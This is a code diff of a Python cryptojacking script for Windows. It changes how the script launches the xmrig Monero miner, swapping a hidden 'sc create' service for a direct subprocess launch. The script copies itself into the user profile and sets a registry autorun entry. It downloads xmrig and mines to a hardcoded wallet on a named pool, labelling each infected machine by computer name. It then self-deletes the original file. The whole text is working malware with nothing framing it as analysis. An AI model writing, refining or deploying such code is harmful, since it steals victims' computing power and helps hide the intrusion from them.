@@ -66,45 +66,37 @@ def check_and_download_xmrig(userprofile):
     else:
         print("xmrig.exe already exists in the userprofile directory.")
 
-# Function to create and start xmrig.exe as a Windows service running in the background
-def create_and_start_service(userprofile):
+# Function to run xmrig.exe with the specified parameters
+def run_xmrig(userprofile):
     xmrig_path = os.path.join(userprofile, "xmrig.exe")
     if not os.path.exists(xmrig_path):
-        print("xmrig.exe not found in userprofile, cannot create service.")
+        print("xmrig.exe not found in userprofile, cannot run.")
         return
-
     # Determine the number of threads as floor(cpu_count / 2)
     cpu_count = os.cpu_count() or 1
     threads = cpu_count // 2 if cpu_count > 1 else 1
-
     # Construct the unique name using the computer name and a random 6-digit number
     computer_name = os.environ.get("COMPUTERNAME", "unknown")
     random_number = f"{random.randint(0, 999999):06d}"
     unique_name = f"{computer_name}_{random_number}"
-
-    # Build the command with replaced parameters for xmrig.exe
-    service_cmd = f"\"{xmrig_path}\" -k -a rx -t {threads} -o gulf.moneroocean.stream:10128 --asm=intel --randomx-mode=fast -k -u 47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP.{unique_name} --donate-level 0"
-    
-    # Check if the service already exists using 'sc query'
+    # Build the command with replaced parameters
+    cmd = [
+        xmrig_path,
+        "-k",
+        "-a", "rx",
+        "-t", str(threads),
+        "-o", "gulf.moneroocean.stream:10128",
+        "--asm=intel",
+        "--randomx-mode=fast",
+        "-k",
+        "-u", f"47ekr2BkJZ4KgCt6maJcrnWhz9MfMfetPPnQSzf4UyXvAKTAN3sVBQy6R9j9p7toHa9yPyCqt9n43N3psvCwiFdHCJNNouP.{unique_name}",
+        "--donate-level", "0"
+    ]
     try:
-        result = subprocess.run("sc query xmrservice", shell=True, capture_output=True, text=True, 
-                                  creationflags=subprocess.CREATE_NO_WINDOW)
-        if "SERVICE_NAME" in result.stdout:
-            print("Service 'xmrservice' already exists.")
-        else:
-            # Create the service using 'sc create'
-            create_cmd = f'sc create xmrservice binPath= "{service_cmd}" start= auto'
-            subprocess.run(create_cmd, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            print("Service 'xmrservice' created successfully.")
+        subprocess.Popen(cmd, shell=False)
+        print("xmrig.exe has been started with the specified parameters.")
     except Exception as e:
-        print("Error creating service:", e)
-    
-    # Start the service with no visible window
-    try:
-        subprocess.run("sc start xmrservice", shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        print("Service 'xmrservice' started successfully.")
-    except Exception as e:
-        print("Error starting service:", e)
+        print("Error starting xmrig.exe:", e)
 
 # Function to create a batch file that deletes the original script and then itself
 def self_delete():
@@ -124,27 +116,32 @@ def self_delete():
     except Exception as e:
         print("Error deleting file:", e)
 
-# Main execution block: copy the script, add to startup if necessary, check/download xmrig.exe,
-# create and start xmrig.exe as a Windows service running in the background, and delete the original script.
+# Main execution block
 if __name__ == "__main__":
-    # Step 1: Copy the script to %USERPROFILE%
-    dest_file = copy_to_userprofile()
-    
-    # Step 2: Check the registry; if the entry does not exist, add it
-    if not check_registry():
-        add_to_startup(dest_file)
-    else:
-        print("Registry entry 'xmrservice' already exists.")
-    
-    # Step 3: Check and download xmrig.exe if it is not in the userprofile directory
     userprofile = os.environ.get("USERPROFILE")
-    if userprofile:
-        check_and_download_xmrig(userprofile)
-        # Step 4: Create and start xmrig.exe as a Windows service running in the background
-        create_and_start_service(userprofile)
-    else:
+    if not userprofile:
         print("Cannot find USERPROFILE environment variable.")
+        sys.exit(1)
     
-    # Step 5: Self-delete the original script
-    self_delete()
-    sys.exit()
+    current_dir = os.path.abspath(os.path.dirname(sys.argv[0]))
+    # Check if the script is running from %USERPROFILE%
+    if current_dir.lower() != userprofile.lower():
+        # If not running from userprofile, copy the script there and run from the copy
+        dest_file = copy_to_userprofile()
+        if not check_registry():
+            add_to_startup(dest_file)
+        else:
+            print("Registry entry 'xmrservice' already exists.")
+        check_and_download_xmrig(userprofile)
+        run_xmrig(userprofile)
+        self_delete()
+        sys.exit()
+    else:
+        # Already running from %USERPROFILE%, so just run normally without copying or self-deleting
+        if not check_registry():
+            add_to_startup(sys.argv[0])
+        else:
+            print("Registry entry 'xmrservice' already exists.")
+        check_and_download_xmrig(userprofile)
+        run_xmrig(userprofile)
+        sys.exit()
